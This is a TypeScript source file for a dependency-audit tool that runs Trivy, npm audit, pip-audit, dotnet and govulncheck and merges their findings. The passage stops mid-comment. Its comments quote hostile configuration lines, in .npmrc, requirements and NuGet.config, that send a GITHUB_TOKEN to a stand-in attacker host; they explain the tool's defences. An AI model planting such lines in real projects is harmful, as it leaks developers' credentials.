/**
 * `deps_audit` — dependency audit (Trivy + bot detection + stack-specific
 * auditors).
 *
 * Builds on `scan_deps` (same Trivy invocation, plus a manifest-coverage
 * check — see `trivy.ts`'s own module comment for the bare-`.csproj` /
 * bare-`package.json` silent gap it closes) and adds:
 *
 *   - `bot_configured` flag — whether the project already has renovate.json
 *     or .github/dependabot.yml in place;
 *   - `npm audit --json` (npm 7+/6 both supported) parsed into Findings via
 *     `npmAuditParser` — npm's GitHub-advisory coverage is complementary to
 *     Trivy's, so its vulnerabilities are counted rather than merely
 *     captured. To avoid double-counting, an npm finding that is an advisory
 *     Trivy already reported for that package and manifest is dropped (Trivy
 *     is canonical); every other npm finding is kept. It runs on a copy of
 *     the manifests, so the repository's `.npmrc` is never read
 *     ({@link runNpmAudit});
 *   - `pip-audit --format json`, run per `requirements*.txt` file (`-r`) when
 *     any exist, else against the project directory for a `pyproject.toml`
 *     project — NEVER bare, which audits whatever Python is on PATH (the MCP
 *     host's own interpreter, not this project's dependencies). Parsed via
 *     `pipAuditParser`;
 *   - `dotnet list <target> package --vulnerable --include-transitive
 *     --format json --no-restore`, one call per root `.sln`/`.slnx`
 *     (preferred) or `.csproj`, when the .NET SDK is on PATH. **Each one is
 *     preceded by `dotnet restore <target> --locked-mode`**, which evaluates
 *     and runs the project's own MSBuild and reaches its NuGet feeds — the
 *     same trust boundary `deps_update_plan`'s own dotnet branch crosses.
 *     `../deps/dotnetRestore.ts` has the measured rules that keep that
 *     restore from creating or rewriting a lock file. Parsed via
 *     `dotnetScaParser`. Trivy cannot cover this stack at all without a
 *     `packages.lock.json` (see `trivy.ts`), so this is NuGet's only source
 *     of CVE-adjacent findings, not a complementary one like npm's.
 *
 *   - `govulncheck -format json ./...`, once per Go module (`go.mod`) when
 *     govulncheck and Go are on PATH (`runners/govulncheckRun.ts`): Trivy
 *     already reports the vulnerable modules; govulncheck reports, at the
 *     project's own call site, each vulnerable FUNCTION the code calls.
 *     The Go database gives no severity: such a finding takes Trivy's for
 *     the same CVE or GHSA ({@link withTrivySeverity}), `medium` otherwise.
 *
 * pip-audit resolves `-r` requirements by building a temporary virtualenv
 * and installing them into it from PyPI — network access, and an sdist's own
 * build step runs there. The tool description says so, next to the restore.
 * Every package manager here runs in the package-manager environment
 * ({@link auditEnv}), never this server's.
 *
 * All raw outputs are persisted under `.guardian/reports/depsaudit-<scan>/`.
 */

import { writeFileSync } from 'node:fs';
import { packageManagerEnvOptions } from '../fixpr/childEnv.js';
import { checkNpmSources, npmSourcesRefusal } from '../fixpr/repoPackageConfig.js';
import { packageManagerEnv } from '../fixpr/testCommandEnv.js';
import { gitRootAbove, npmConfigNotRead, npmPlanningCopy } from '../deps/npmPlanningCopy.js';
import { presentInProject, readProjectTextOrUndefined } from '../platform/projectFs.js';
import { join, relative } from 'node:path';
import {
  classifyRestoreFailure,
  findDotnetTargets,
  planDotnetRestore,
  removeCreatedLockFiles,
} from '../deps/dotnetRestore.js';
import { dotnetScaParser } from '../runners/scannerParsers/dotnetSca.js';
import { govulncheckParser } from '../runners/scannerParsers/govulncheck.js';
import { govulncheckModules } from '../runners/govulncheckRun.js';
import { listScannedFiles } from '../platform/guardianIgnore.js';
import { findingVulnIds, vulnIdKey } from '../intel/vulnIds.js';
import { NPM_AUDIT_TOOL_NAME, npmAuditParser } from '../runners/scannerParsers/npmAudit.js';
import { pipAuditParser } from '../runners/scannerParsers/pipAudit.js';
import { TRIVY_TOOL_NAME, trivyParser } from '../runners/scannerParsers/trivy.js';
import { runProcess } from '../runners/processRunner.js';
import { nameRepoConfig, withProjectConfig, type HonouredFile } from '../runners/repoConfig.js';
import { checkRequirements, findRequirementFiles, INDEX_KINDS, SOURCE_KINDS, type PipRefusal } from '../deps/pipRequirements.js';
import { checkPyproject, checkSetupCfg } from '../deps/pythonProject.js';
import { judgeTrivyFs, runTrivy, type TrivyFsJudgement } from '../runners/trivyRun.js';
import { trivySkipArgs } from '../platform/guardianIgnore.js';
import { Force, ProjectPath, SeverityMin } from '../schemas.js';
import type { Finding, ToolRun } from '../types.js';
import { registerToolModule } from './index.js';
import {
  ensureReportDir,
  readJsonSafe,
  scannerAvailable,
} from './scanHelpers.js';
import {
  makeScanTool,
  type ScannerInvocation,
} from './scanToolFactory.js';

interface BotConfigured {
  renovate: boolean;
  dependabot: boolean;
}

/**
 * The package name a scanner encoded in a finding's snippet. Both parsers write
 * `${pkg}@${version…}` (Trivy: `pkg@installed->fixed`; npm: `pkg@range`), so the
 * name is everything before the LAST `@` — which keeps scoped names like
 * `@babel/core` intact. Returns null when no package can be recovered.
 */
function packageFromSnippet(snippet: string | undefined): string | null {
  if (!snippet) return null;
  const at = snippet.lastIndexOf('@');
  if (at <= 0) return null; // no version marker, or a leading '@' with empty name
  return snippet.slice(0, at).trim().toLowerCase() || null;
}

/**
 * Trivy is the canonical CVE source across stacks; npm audit is here for the
 * GitHub advisories Trivy misses. An npm-audit finding is dropped only when
 * it IS a Trivy finding seen twice — Trivy by CVE, npm by GHSA: an advisory
 * id in common (Trivy's CVE and its VendorIDs, npm's GHSA and CVE ids —
 * `intel/vulnIds.ts#findingVulnIds`), the same package, in the same
 * manifest's directory (npm audit reads the root's). No version is compared:
 * npm's finding carries the advisory's vulnerable RANGE, one per advisory and
 * package whatever versions are installed, and Trivy reports that advisory
 * only for an installed version inside it — the shared id already pins it.
 * It used to drop every npm finding of any package Trivy flagged at all: a
 * second advisory of that package, which Trivy's database did not carry, and
 * the root's advisory of a package Trivy flagged in another lock, were lost.
 */
function dropNpmDuplicatesOfTrivy(findings: Finding[]): Finding[] {
  const trivy = findings
    .filter((f) => f.tool === TRIVY_TOOL_NAME && f.subcategory === 'cve')
    .map((f) => ({
      pkg: packageFromSnippet(f.snippet),
      dir: manifestDir(f.file_path),
      ids: new Set(findingVulnIds(f).map(vulnIdKey)),
    }));
  if (trivy.length === 0) return findings;
  return findings.filter((f) => {
    if (f.tool !== NPM_AUDIT_TOOL_NAME) return true;
    const pkg = packageFromSnippet(f.snippet);
    if (pkg === null) return true;
    const ids = findingVulnIds(f).map(vulnIdKey);
    const dir = manifestDir(f.file_path);
    return !trivy.some((t) => t.pkg === pkg && t.dir === dir && ids.some((id) => t.ids.has(id)));
  });
}

/** The directory of a finding's manifest, project-relative (`''` at the root). */
function manifestDir(path: string | undefined): string {
  const p = (path ?? '').replace(/\\/g, '/');
  const slash = p.lastIndexOf('/');
  return slash < 0 ? '' : p.slice(0, slash);
}

/**
 * A govulncheck finding (a vulnerable function the code calls) takes the
 * severity Trivy gave the same vulnerability — matched by any CVE / GHSA /
 * GO id either finding carries — because the Go vulnerability database gives
 * none. Otherwise it keeps the parser's `medium`.
 */
export function withTrivySeverity(findings: Finding[]): Finding[] {
  const severityById = new Map<string, Finding['severity']>();
  for (const f of findings) {
    if (f.tool !== TRIVY_TOOL_NAME) continue;
    for (const id of [f.rule_id, ...(f.vuln_aliases ?? [])]) if (id !== undefined) severityById.set(id.toUpperCase(), f.severity);
  }
  if (severityById.size === 0) return findings;
  return findings.map((f) => {
    if (f.tool !== 'govulncheck') return f;
    for (const id of [f.rule_id, ...(f.vuln_aliases ?? [])]) {
      const severity = id !== undefined ? severityById.get(id.toUpperCase()) : undefined;
      if (severity !== undefined) return { ...f, severity };
    }
    return f;
  });
}

function detectBots(projectPath: string): BotConfigured {
  return {
    renovate:
      presentInProject(projectPath, 'renovate.json') ||
      presentInProject(projectPath, '.renovaterc') ||
      presentInProject(projectPath, '.renovaterc.json'),
    dependabot: presentInProject(projectPath, join('.github', 'dependabot.yml')),
  };
}

registerToolModule(
  makeScanTool({
    name: 'deps_audit',
    title: 'Dependency audit (Trivy and native auditors)',
    description:
      "Trivy fs plus the stack's own auditors: npm audit on a copy of the manifests, never the repo's .npmrc; " +
      "pip-audit in a temporary virtualenv it installs the requirements into from PyPI (an sdist's build runs); " +
      "for .NET, a locked restore and dotnet list package --vulnerable, which runs the project's MSBuild and " +
      "contacts its NuGet feeds (an out-of-sync lock is a gap) — none given the server's tokens; for Go, " +
      'govulncheck, which reports the vulnerable functions the code calls. Returns findings, indexed CVEs and ' +
      '`bot_configured` (Renovate or Dependabot).',
    // Its own type, not scan_deps' 'deps': the two shared cache entries and
    // answered for each other. Readers that want "the latest deps_audit" use
    // `isDepsAuditScan`, which also recognises the 2.0.x rows typed 'deps'.
    scan_type: 'deps_audit',
    category: 'security',
    supportsAutoFix: false,
    inputSchema: {
      project_path: ProjectPath,
      severity_min: SeverityMin,
      force: Force,
    },
    invoke: async (_input, ctx): Promise<ScannerInvocation> => {
      const reportDir = ensureReportDir(ctx.projectPath, ctx.scanId, 'depsaudit');
      const tools_run: ToolRun[] = [];
      const missing_tools: string[] = [];
      const parser_inputs: ScannerInvocation['parser_inputs'] = [];

      // --- Trivy fs (canonical CVE source for all stacks) ---------------
      let manifestCoverageGaps: TrivyFsJudgement['gaps'] = [];
      const trivyBin = await scannerAvailable('trivy');
      if (trivyBin) {
        const outFile = join(reportDir, 'deps.json');
        // Never in the project, never its trivy.yaml (runners/trivyRun.ts).
        const result = await runTrivy({
          args: ['fs', '--scanners', 'vuln,license', '--format', 'json', '--output', outFile, '--quiet', ...trivySkipArgs(ctx.exclusions)],
          target: ctx.projectPath,
          workDir: reportDir,
          ignoreFrom: ctx.projectPath,
          env: ctx.scriptEnv,
          signal: ctx.signal,
          onLog: ctx.onLog,
        });
        const raw = readJsonSafe(outFile);
        if (raw) parser_inputs.push({ parser: trivyParser, input: raw });
        // The one judgement scan_deps, deps_audit and scan_wordpress share
        // (runners/trivyRun.ts#judgeTrivyFs): a manifest anywhere in the
        // tree that Trivy read nothing for (e.g. a bare .csproj with no
        // packages.lock.json) must never read as a clean scan.
        const judged = judgeTrivyFs({ projectPath: ctx.projectPath, raw, run: result, exclusions: ctx.exclusions });
        tools_run.push(judged.toolRun);
        missing_tools.push(...judged.missing);
        manifestCoverageGaps = judged.gaps;
      } else {
        tools_run.push({ name: 'trivy', status: 'skipped', reason: 'not_installed' });
        missing_tools.push('trivy');
      }

      // --- Native auditors ----------------------------------------------
      // npm audit is parsed into Findings; so is pip-audit, now that it is
      // pointed at this project's own manifests instead of the host Python.
      // npm runs on a copy of the manifests, so the repository's own npm
      // configuration is never read — named in the result (`runNpmAudit`).
      const hasPackageJson = presentInProject(ctx.projectPath, 'package.json');
      const npmConfigSkipped = hasPackageJson ? npmConfigNotRead(ctx.projectPath) : [];
      if (hasPackageJson) {
        await runNpmAudit({
          outFile: join(reportDir, 'npm-audit.json'),
          ctx,
          notRead: npmConfigSkipped,
          tools_run,
          missing_tools,
          parser_inputs,
        });
      }

      // pip-audit: NEVER invoked bare — a bare `pip-audit` audits whatever
      // Python is on PATH (the MCP host's own interpreter), not this
      // project's dependencies. One invocation PER requirements file (so
      // each finding is attributed to its REAL source file, fix round 1
      // item 9 — pip-audit's own JSON output never says which file a
      // dependency came from when several are combined into one call), or
      // the project directory for a pyproject.toml-only project.
      await runPipAudit({ ctx, reportDir, tools_run, missing_tools, parser_inputs });

      // .NET SCA: Trivy cannot cover NuGet at all without a
      // packages.lock.json (trivy.ts's own module comment), so this is the
      // stack's only source of dependency findings, run whenever a
      // .sln/.csproj exists and the SDK is on PATH.
      const dotnetFailures = await runDotnetSca({ ctx, reportDir, tools_run, missing_tools, parser_inputs });

      // Go: govulncheck per module, for the vulnerable functions the code
      // calls (the modules themselves are Trivy's, above).
      const files = ctx.exclusions !== null ? ctx.exclusions.keptFiles : await listScannedFiles(ctx.projectPath);
      const govuln = await govulncheckModules({
        projectPath: ctx.projectPath,
        files,
        env: ctx.scriptEnv,
        signal: ctx.signal,
        ...(ctx.onLog ? { onLog: ctx.onLog } : {}),
      });
      for (const r of govuln.reports) parser_inputs.push({ parser: govulncheckParser, input: r });
      if (govuln.toolRun !== null) tools_run.push(govuln.toolRun);
      for (const name of govuln.missing) if (!missing_tools.includes(name)) missing_tools.push(name);

      const bot_configured = detectBots(ctx.projectPath);

      return {
        outcome: 'completed',
        tools_run,
        missing_tools,
        parser_inputs,
        dedupeFindings: (findings) => withTrivySeverity(dropNpmDuplicatesOfTrivy(findings)),
        report_paths: [reportDir],
        extras: {
          bot_configured,
          ...(manifestCoverageGaps.length > 0 ? { manifest_coverage_gaps: manifestCoverageGaps } : {}),
          ...(dotnetFailures.length > 0 ? { dotnet_restore_failures: dotnetFailures } : {}),
          // npm audited against the user's own configuration, not these (`runNpmAudit`).
          ...(npmConfigSkipped.length > 0 ? { package_config_not_read: npmConfigSkipped } : {}),
        },
      };
    },
  }),
);

interface NpmAuditOptions {
  outFile: string;
  ctx: Parameters<NonNullable<Parameters<typeof makeScanTool>[0]['invoke']>>[1];
  /** The repository's npm configuration files the copy leaves behind (`npmConfigNotRead`). */
  notRead: readonly string[];
  tools_run: ToolRun[];
  /**
   * Accumulator for auditors that were expected here (the manifest exists) but
   * could not run — not installed, or ran but produced no usable report. A
   * missing auditor is a real coverage gap, so it must be surfaced rather than
   * silently swallowed (otherwise a "0 findings" reads as a clean bill).
   */
  missing_tools: string[];
  /** Accumulator the parsed report is pushed onto. */
  parser_inputs: ScannerInvocation['parser_inputs'];
}

/**
 * A real `npm audit --json` report has a `vulnerabilities` (npm 7+) or
 * `advisories` (npm 6) object. When npm cannot audit (no lockfile, config
 * error) it exits non-zero — often with the *same* code 1 it uses for
 * "vulnerabilities found" — and prints an `{ error: … }` object instead. We
 * must not mistake that error for a clean scan, so success is gated on the
 * output actually being a report.
 */
function looksLikeNpmAuditReport(raw: string): boolean {
  try {
    const j = JSON.parse(raw) as Record<string, unknown>;
    if (!j || typeof j !== 'object' || 'error' in j) return false;
    const isObj = (v: unknown): boolean => typeof v === 'object' && v !== null;
    return isObj(j['vulnerabilities']) || isObj(j['advisories']);
  } catch {
    return false;
  }
}

/** The public npm registry: a project naming it loses nothing by not being read. */
const NPM_PUBLIC_REGISTRY = /^https?:\/\/registry\.npmjs\.org\/?$/i;

/**
 * The registry the project's own `.npmrc` names, when it is not the public
 * one — credentials in the URL removed — or null. Only the unscoped
 * `registry` key: a `@scope:registry` line does not move the audit endpoint.
 *
 * `npm audit` no longer reads that file (`runNpmAudit`), so a project whose
 * `.npmrc` names a private registry is audited against the user's own
 * registry instead; the result says which registry the project named, so
 * "set it in your own configuration" has something to act on.
 */
export function projectNpmRegistry(projectPath: string): string | null {
  // The repository's file: bounded, never through a link out of the project.
  const text = readProjectTextOrUndefined(projectPath, '.npmrc', 1024 * 1024);
  if (text === undefined) return null;
  let registry: string | null = null;
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.trim();
    if (line === '' || line.startsWith('#') || line.startsWith(';')) continue;
    const m = /^registry\s*=\s*(.*)$/i.exec(line);
    if (m?.[1] === undefined) continue;
    // The last one wins, as in npm's own ini reader.
    registry = m[1].trim().replace(/^["']|["']$/g, '');
  }
  if (registry === null || registry === '' || NPM_PUBLIC_REGISTRY.test(registry)) return null;
  // Never echo a credential written into the URL.
  return registry.replace(/^([a-z][a-z0-9+.-]*:\/\/)[^/@]*@/i, '$1');
}

/**
 * `run` naming the repository's npm configuration npm audit did not read —
 * and, when the project's `.npmrc` names a registry of its own, that it was
 * not asked. Unchanged when the repository carries none.
 */
function withNpmConfigNotRead(run: ToolRun, projectPath: string, notRead: readonly string[]): ToolRun {
  if (notRead.length === 0) return run;
  const registry = notRead.includes('.npmrc') ? projectNpmRegistry(projectPath) : null;
  const notes = [
    `not read: the project's ${notRead.join(', ')} — npm audit ran on a copy of the manifests, with your own npm configuration (~/.npmrc, NPM_CONFIG_*)`,
    ...(registry !== null
      ? [`the project's .npmrc names ${registry} as its registry, which was not asked: to audit against it, set it in your own ~/.npmrc`]
      : []),
  ];
  const reason = [run.reason, ...notes].filter((s) => s !== undefined && s.length > 0).join('; ');
  return { ...run, reason };
}

/**
 * `npm audit --json`, on a copy of the project's manifest and lock files
 * (`deps/npmPlanningCopy.ts`), in the package-manager environment
 * ({@link auditEnv}) — never in the project, never with this server's
 * environment. Measured on npm 11.20.0 (2026-10-27), run in the project as it
 * was: npm read the repository's `.npmrc` (`registry=http://<attacker>/`,
 * `//<attacker>/:_authToken=${GITHUB_TOKEN}`), expanded the token from the
 * server's environment and POSTed the dependency list to the attacker's
 * bulk-advisory endpoint with `Authorization: Bearer <the token>` — and the
 * attacker's `{}` read as a clean audit. The project's `.npmrc` used to be
 * honoured on purpose (a private registry is legitimate); now the user's own
 * configuration is the only one npm reads, and the files it left behind are
 * named ({@link withNpmConfigNotRead}, and the result's
 * `package_config_not_read`). Not run at all when a dependency points at a
 * network path, or a file npm reads could not be checked for one
 * (`fixpr/repoPackageConfig.ts#checkNpmSources`): opening it on Windows
 * authenticates to the host — deps_update_plan's rule.
 */
async function runNpmAudit(opts: NpmAuditOptions): Promise<void> {
  const { ctx, tools_run, missing_tools } = opts;
  if (!(await scannerAvailable('npm'))) {
    tools_run.push({ name: 'npm', status: 'skipped', reason: 'not_installed' });
    // The manifest exists but its auditor is absent — a real coverage gap.
    missing_tools.push('npm');
    return;
  }
  const named = (run: ToolRun): ToolRun => withNpmConfigNotRead(run, ctx.projectPath, opts.notRead);
  const refused = npmSourcesRefusal(checkNpmSources(ctx.projectPath, gitRootAbove(ctx.projectPath) ?? ctx.projectPath));
  const copy = refused === null ? npmPlanningCopy(ctx.projectPath) : { ok: false as const, reason: refused };
  if (!copy.ok) {
    tools_run.push(named({ name: 'npm', status: 'failed', reason: `not run: ${copy.reason}` }));
    missing_tools.push('npm');
    return;
  }
  let result: Awaited<ReturnType<typeof runProcess>>;
  try {
    result = await runProcess({
      command: 'npm',
      args: ['audit', '--json', '--audit-level=info'],
      cwd: copy.dir,
      ...auditEnv(),
      signal: ctx.signal,
      onLog: ctx.onLog,
    });
  } finally {
    copy.dispose();
  }
  // npm audit writes to stdout; redirect ourselves.
  if (result.stdout.length > 0) {
    try {
      writeFileSync(opts.outFile, result.stdout, 'utf8');
    } catch {
      /* swallow */
    }
  }
  // Exit code 0/1 (or `completed`) is a run that produced output — npm exits
  // 1 when vulnerabilities are present, which is information, not failure.
  // But npm ALSO exits 1 on a hard error (no lockfile), so the output must be
  // a real audit report too. An error masquerading as exit 1 must count as a
  // gap, not a clean "0 findings".
  const exitOk = result.outcome === 'completed' || result.exitCode === 0 || result.exitCode === 1;
  const ok = exitOk && looksLikeNpmAuditReport(result.stdout);
  if (ok) {
    opts.parser_inputs.push({ parser: npmAuditParser, input: result.stdout });
    tools_run.push(named({ name: 'npm', status: 'ok', reason: 'parsed into findings' }));
  } else {
    const reason = exitOk ? 'ran but produced no audit report (missing lockfile?)' : 'failed to run';
    tools_run.push(named({ name: 'npm', status: 'failed', reason }));
    // A failed auditor is a coverage gap — surface it so the roll-up and the
    // executive summary do not read the result as fully covered.
    missing_tools.push('npm');
  }
}

/**
 * The environment of every package-manager process this tool starts — `npm
 * audit`, `pip-audit` (which installs the requirements into a temporary
 * virtualenv, running an sdist's build code), `dotnet restore` and `dotnet
 * list` (which run the project's MSBuild): create_fix_pr's when it is the
 * caller (`fixpr/childEnv.ts`), else the same allowlist built here
 * (`fixpr/testCommandEnv.ts#packageManagerEnv`), always with `extendEnv:
 * false`. It used to be this server's whole environment outside
 * create_fix_pr, and a repository's own configuration expands a variable
 * into a request — measured 2026-10-27, each answering a local server's 401:
 * an `.npmrc`'s `${GITHUB_TOKEN}` (above); a requirements file's
 * `--index-url http://x:${GITHUB_TOKEN}@<host>/simple`, which pip 26.2.1 sent
 * as `Basic x:<the token>`; a `NuGet.config` feed's `ClearTextPassword` of
 * `%GITHUB_TOKEN%`, which `dotnet restore` (SDK 10.0.403) sent the same way.
 * With the variable absent each sent the literal reference. With this
 * allowlist no token or cloud credential the server was started with reaches
 * them, nor the code an sdist's build or the project's MSBuild runs; the
 * package managers' own variables, and those the user's own `~/.npmrc`
 * names, still do.
 */
function auditEnv(): { env: NodeJS.ProcessEnv; extendEnv: false } {
  const pm = packageManagerEnvOptions();
  return { env: 'env' in pm ? pm.env : packageManagerEnv(), extendEnv: false };
}

// --------------------------------------------------------------- pip-audit

/**
 * `run` naming the requirements candidates `findRequirementFiles` did
 * not hand to pip-audit because they lead out of the project: in the reason,
 * each as not audited. Not in `honoured_config` — nothing was taken from them.
 */
function withOutsideRequirements(run: ToolRun, outside: readonly string[]): ToolRun {
  if (outside.length === 0) return run;
  const notes = outside.map((rel) => `${rel} leads out of the project: not read or audited by dev-guardian`);
  const shown = notes.slice(0, MAX_UNREAD_NAMED);
  const more = notes.length > shown.length ? [`and ${notes.length - shown.length} more not audited`] : [];
  const reason = [run.reason, ...shown, ...more].filter((s) => s !== undefined && s.length > 0).join('; ');
  return { ...run, reason };
}

/**
 * A real `pip-audit --format json` report has a `dependencies` array — even
 * an empty one on a clean project. pip-audit exits 1 on a resolution
 * failure (a Poetry-only `pyproject.toml` it cannot read, a broken
 * requirements file, a network error reaching PyPI) the SAME way it exits 1
 * when vulnerabilities are found, and on that failure path the `-o` file is
 * either never written or contains something that is not this shape (fix
 * round 1, item 3 / Global Constraint 3: "a scanner that failed is never
 * reported as ok"). Mirrors `looksLikeNpmAuditReport` above for the same
 * reason: exit code alone cannot tell a real report apart from a masked
 * error.
 */
function looksLikePipAuditReport(raw: string): boolean {
  try {
    const j = JSON.parse(raw) as Record<string, unknown>;
    return !!j && typeof j === 'object' && Array.isArray(j['dependencies']);
  } catch {
    return false;
  }
}

/**
 * Runs `pip-audit --format json` once PER requirements file (never bare —
 * see this file's own module comment), or once against the project
 * directory for a `pyproject.toml`-only project. One call per file, not one
 * call with several `-r` flags, so `pipAuditParser` can attribute every
 * finding to the REAL file it came from (fix round 1, item 9) — pip-audit's
 * own JSON says nothing about which requirements file a dependency was
 * read from, so a combined call cannot be attributed at all. The captured
 * JSON is annotated with `__source_file` before being handed to the parser
 * (`scanToolFactory.ts` builds one shared `ParserContext` for a whole scan,
 * so a per-call override cannot go through `ctx` — see `pipAuditParser`'s
 * own doc comment).
 *
 * Aggregated into ONE `tools_run` entry across every file (`ok` if at least
 * one call produced a real report, `failed` only if every call did not) —
 * `create_fix_pr` and every other consumer of `tools_run` expect one entry
 * per named tool, the same pattern `runDotnetSca` already uses for multiple
 * `.csproj` targets.
 */
async function runPipAudit(opts: {
  ctx: Parameters<NonNullable<Parameters<typeof makeScanTool>[0]['invoke']>>[1];
  reportDir: string;
  tools_run: ToolRun[];
  missing_tools: string[];
  parser_inputs: ScannerInvocation['parser_inputs'];
}): Promise<void> {
  const { ctx, reportDir, tools_run, missing_tools, parser_inputs } = opts;
  // The one finder (`deps/pipRequirements.ts`): requirements*.txt at the root and
  // one level into requirements/; a candidate linked out of the project is named
  // as not audited, never read or handed over.
  const found = findRequirementFiles(ctx.projectPath);
  const requirementsFiles = found.files.map((rel) => join(ctx.projectPath, ...rel.split('/')));
  const outside = found.outside;
  const hasPyproject = presentInProject(ctx.projectPath, 'pyproject.toml');
  // Nothing to audit — not a gap. A candidate that leads out of the project is one.
  if (requirementsFiles.length === 0 && !hasPyproject && outside.length === 0) return;

  const bin = await scannerAvailable('pip-audit');
  if (!bin) {
    tools_run.push({ name: 'pip-audit', status: 'skipped', reason: 'not_installed' });
    missing_tools.push('pip-audit');
    return;
  }
  // Something left unaudited is a gap in coverage, whatever the rest did.
  if (outside.length > 0) missing_tools.push('pip-audit');
  if (requirementsFiles.length === 0 && !hasPyproject) {
    tools_run.push(withOutsideRequirements({ name: 'pip-audit', status: 'skipped' }, outside));
    return;
  }

  // One "target" per invocation: each requirements file individually, or
  // the project directory itself when there is no requirements file at all.
  const targets: Array<{ arg: string; sourceFile: string }> =
    requirementsFiles.length > 0
      ? requirementsFiles.map((f) => ({ arg: f, sourceFile: relative(ctx.projectPath, f) || f }))
      : [{ arg: ctx.projectPath, sourceFile: 'pyproject.toml' }];

  let anyOk = false;
  let anyFailed = false;
  for (const [i, target] of targets.entries()) {
    const outFile = join(reportDir, `pip-audit-${i}.json`);
    const args =
      requirementsFiles.length > 0
        ? ['-r', target.arg, '--format', 'json', '-o', outFile]
        : ['--format', 'json', '-o', outFile, target.arg];
    const result = await runProcess({
      command: 'pip-audit',
      args,
      cwd: ctx.projectPath,
      ...auditEnv(),
      signal: ctx.signal,
      onLog: ctx.onLog,
    });
    // Exit 0/1 alone is not success — pip-audit exits 1 on a genuine
    // failure the same way it does on "vulnerabilities found" (item 3).
    const exitOk = result.outcome === 'completed' || result.exitCode === 0 || result.exitCode === 1;
    const raw = exitOk ? readJsonSafe(outFile) : null;
    if (raw && looksLikePipAuditReport(raw)) {
      anyOk = true;
      let annotated = raw;
      try {
        const parsed = JSON.parse(raw) as Record<string, unknown>;
        parsed['__source_file'] = target.sourceFile;
        annotated = JSON.stringify(parsed);
      } catch {
        /* raw already passed looksLikePipAuditReport, so this is unreachable
         * in practice; fall back to the unannotated text rather than drop it */
      }
      parser_inputs.push({ parser: pipAuditParser, input: annotated });
    } else {
      anyFailed = true;
    }
  }

  // What decides where pip-audit's resolution installs from, named
  // (`runners/repoConfig.ts`): honoured — a private index, a VCS dependency
  // are legitimate in the user's own audit — never silently. Read with the
  // same fail-closed parser create_fix_pr refuses by (`deps/pipRequirements.ts`),
  // so an index option, a direct / URL / VCS / network-path requirement, an
  // editable one, and what pip reads that this server could not check (an
  // include out of the project or of a URL, `${VAR}`, an unreadable file)
  // are each named with its line — a URL as `scheme://host` only.
  const steering = pipSourcesNamed(ctx.projectPath, requirementsFiles, requirementsFiles.length === 0 && hasPyproject);
  const named = (run: ToolRun): ToolRun => withOutsideRequirements(withProjectConfig(run, steering), outside);
  if (anyOk) {
    tools_run.push(
      named({
        name: 'pip-audit',
        status: 'ok',
        reason: anyFailed ? 'parsed into findings (failed for at least one target)' : 'parsed into findings',
      }),
    );
    if (anyFailed && outside.length === 0) missing_tools.push('pip-audit');
  } else {
    tools_run.push(
      named({
        name: 'pip-audit',
        status: 'failed',
        reason: 'ran but produced no audit report for any target (resolution failure or unsupported project?)',
      }),
    );
    if (outside.length === 0) missing_tools.push('pip-audit');
  }
}

/** Refusals shown per file in a note; `honoured_config` names every file. */
const MAX_LINES_NAMED = 3;
/** Requirements candidates leading out of the project, named in the reason at most. */
const MAX_UNREAD_NAMED = 5;

/**
 * What decides where pip-audit installs from, as honoured-config entries:
 * the requirements files handed to it (and all they include), or — when it
 * builds the project itself — `pyproject.toml` and `setup.cfg`. One entry
 * per file and category, its lines named:
 *
 *   - index options: "its package-index options decide which index
 *     pip-audit's resolution installs from" (the wording `REPO_CONFIG` has
 *     always used);
 *   - a direct, URL, VCS, network-path, local-path or editable requirement,
 *     a tool's own source table: "its <kinds> (line N (scheme://host)) decide
 *     where pip-audit's resolution fetches from";
 *   - anything else the parser did not admit: "pip reads what dev-guardian
 *     did not check (line N: …) — pip may take its sources from it".
 */
function pipSourcesNamed(projectPath: string, requirementsFiles: readonly string[], buildsProject: boolean): HonouredFile[] {
  const handed = requirementsFiles.map((f) => relative(projectPath, f) || f);
  const refusals: PipRefusal[] = [
    ...checkRequirements(projectPath, handed, projectPath).refusals,
    ...(buildsProject ? [...checkPyproject(projectPath, projectPath, true), ...checkSetupCfg(projectPath, projectPath)] : []),
  ];
  const groups = new Map<string, { category: 'index' | 'source' | 'unchecked'; items: PipRefusal[] }>();
  for (const r of refusals) {
    const category = INDEX_KINDS.has(r.kind) ? 'index' : SOURCE_KINDS.has(r.kind) ? 'source' : 'unchecked';
    const key = `${r.file}\0${category}`;
    const g = groups.get(key) ?? { category, items: [] };
    g.items.push(r);
    groups.set(key, g);
  }
  const lineOf = (r: PipRefusal): string => {
    const at = r.line > 0 ? `line ${r.line}` : 'the file';
    const extra = [r.detail, r.host].filter((x): x is string => x !== undefined && x !== '');
    return `${at}${extra.length > 0 ? ` (${extra.join(', ')})` : ''}`;
  };
  const out: HonouredFile[] = [];
  for (const [key, g] of groups) {
    const file = key.slice(0, key.indexOf('\0'));
    const shown = g.items.slice(0, MAX_LINES_NAMED);
    const more = g.items.length > shown.length ? ` and ${g.items.length - shown.length} more` : '';
    if (g.category === 'index') {
      out.push({ path: file, decides: "its package-index options decide which index pip-audit's resolution installs from" });
    } else if (g.category === 'source') {
      const kinds = [...new Set(g.items.map((r) => r.kind))].join(', ');
      out.push({ path: file, decides: `its ${kinds} (${shown.map(lineOf).join('; ')}${more}) decide where pip-audit's resolution fetches from` });
    } else {
      const what = shown.map((r) => `${lineOf(r).replace(/^line \d+|^the file/, (m) => `${m}: ${r.kind}`)}`).join('; ');
      out.push({ path: file, decides: `pip reads what dev-guardian did not check (${what}${more}) — pip may take its sources from it` });
    }
  }
  return out.sort((a, b) => (a.path < b.path ? -1 : a.path > b.path ? 1 : 0));
}


// --------------------------------------------------------------- .NET SCA

/** One target's restore/list failure, surfaced structurally in the scan's
 *  extras (`dotnet_restore_failures`) as well as in the tool's reason. */
interface DotnetTargetFailure {
  target: string;
  code: string;
  reason: string;
}

/**
 * Runs `dotnet list <target> package --vulnerable --include-transitive
 * --format json --no-restore` for every target `findDotnetTargets` finds,
 * each one preceded by an explicit `dotnet restore` planned by
 * `planDotnetRestore` (`../deps/dotnetRestore.ts` — its module comment has
 * the measured rules): `--locked-mode` on every restore, lock files found from
 * the solution/project list rather than a depth-limited walk, and a restore
 * that would create a lock file is either prevented
 * (`-p:RestorePackagesWithLockFile=false`) or not run at all. `dotnet list`
 * never restores on its own (`--no-restore`), so the listing is always built
 * from the restore this call just ran — which is also why no
 * `requestedVersion`/`resolvedVersion` comparison is made any more: after a
 * fresh restore the two legitimately differ for every floating (`12.*`),
 * range (`[12.0.1,13.0)`), two-part (`12.0`) or not-on-the-feed (`12.0.0`
 * resolving to `12.0.1`) reference, and treating that as staleness threw real
